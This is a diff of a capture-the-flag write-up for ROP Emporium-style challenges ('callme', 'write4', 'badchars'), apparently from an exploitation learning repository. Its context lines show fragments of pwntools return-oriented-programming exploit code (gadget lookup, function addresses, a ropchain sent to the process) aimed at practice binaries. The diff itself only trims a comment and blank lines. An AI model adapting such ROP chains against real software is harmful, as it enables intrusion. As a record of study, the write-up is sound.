@@ -33,7 +33,7 @@ elf = ELF("./callme")
 rop = ROP("./callme")
 
 padding = cyclic(40)
-gadget = p64((rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"]))[0]) # /R pop rdi in r2 and find a stub with pop rdi pop rsi pop rdx and ret
+gadget = p64((rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"]))[0])
 callme_1 = p64(elf.symbols['callme_one'])
 callme_2 = p64(elf.symbols['callme_two'])
 callme_3 = p64(elf.symbols['callme_three'])
@@ -72,7 +72,6 @@ ropchain += third_call(padding, gadget, callme_3)
 
 p.sendline(ropchain)
 p.interactive()
-
 ```
 
 <div id='write4-writeup'/>
@@ -137,7 +136,6 @@ pld += print_file
 p.sendline(pld)
 p.interactive()
 ```
-
 
 <div id='badchars-writeup'/>
 # badchars
